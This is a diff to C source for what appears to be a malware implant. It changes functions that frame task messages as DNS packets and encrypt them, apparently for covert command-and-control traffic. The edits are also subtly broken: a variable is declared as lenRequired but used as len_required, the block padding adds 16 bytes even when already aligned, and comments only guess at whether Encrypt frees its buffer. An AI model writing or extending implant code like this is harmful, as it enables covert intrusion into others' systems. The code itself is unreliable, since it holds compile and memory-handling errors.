@@ -76,7 +76,9 @@ static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
 
 BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength, CONST PBYTE payload)
 {
-	PBYTE msg = ImplantHeapAlloc(TLV_HEADER_SIZE + payloadLength);
+	DWORD lenRequired = DNS_HEADER_SIZE + TLV_HEADER_SIZE + payloadLength;
+	lenRequired += (16 - (lenRequired % 16)); // pad to block size for encryption
+	PBYTE msg = ImplantHeapAlloc(len_required);
 
 	ASSERT(sock != INVALID_SOCKET);
 
@@ -162,6 +164,7 @@ BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYT
 	dummyAuthority = 0;
 	dummyAdditional = 0;
 	length = (USHORT)*payloadLength;
+	PBYTE payload_copy = ImplantHeapAlloc(*payloadLength + TLV_HEADER_SIZE);
 
 	//memcpy(dest, src, size);
 	memcpy(*msg, &taskId, sizeof(USHORT));
@@ -171,9 +174,14 @@ BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYT
 	memcpy(*msg + DNS_AUTHORITY_OFFSET, &dummyAuthority, sizeof(USHORT));
 	memcpy(*msg + DNS_ADDITIONAL_OFFSET, &dummyAdditional, sizeof(USHORT));
 
-	Encrypt(&payload, *payloadLength + TLV_HEADER_SIZE);
 
-	memcpy(*msg + DNS_HEADER_SIZE, payload, *payloadLength);
+	// C
+	memcpy(payload_copy, payload, *payloadLength);
+	/* Encrypt will take ownership of payload_copy and free it on success */
+	Encrypt(&payload_copy, *payloadLength + TLV_HEADER_SIZE);
+	/* use payload_copy (encrypted buffer) here */
+	memcpy(*msg + DNS_HEADER_SIZE, payload_copy, *payloadLength); // ensure length is correct
+	// ImplantHeapFree(payload_copy) not needed if Encrypt frees on success
 
 	*payloadLength = (DWORD)(length + DNS_HEADER_SIZE);
 
@@ -201,9 +209,10 @@ BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
 	PBYTE temp = *msg;
 	ULONG sizeRequired = 0;
 	HANDLE keyFile = NULL;
-	UCHAR ivBuff[IV_SIZE] = { 0 };
 	BOOL ret = TRUE;
-	memcpy(ivBuff, IV, IV_SIZE);
+	UCHAR ivInitial[IV_SIZE] = IV;
+	UCHAR ivBuff[IV_SIZE] = { 0 };
+	memcpy(ivBuff, ivInitial, IV_SIZE);
 
 	if (status != STATUS_SUCCESS)
 	{
@@ -285,8 +294,9 @@ BOOL Decrypt(PBYTE msg, DWORD* msgLength) {
 	ULONG sizeRequired = 0;
 	HANDLE keyFile = NULL;
 	BOOL ret = TRUE;
+	UCHAR ivInitial[IV_SIZE] = IV;
 	UCHAR ivBuff[IV_SIZE] = { 0 };
-	memcpy(ivBuff, IV, IV_SIZE);
+	memcpy(ivBuff, ivInitial, IV_SIZE);
 
 	if (status != STATUS_SUCCESS)
 	{
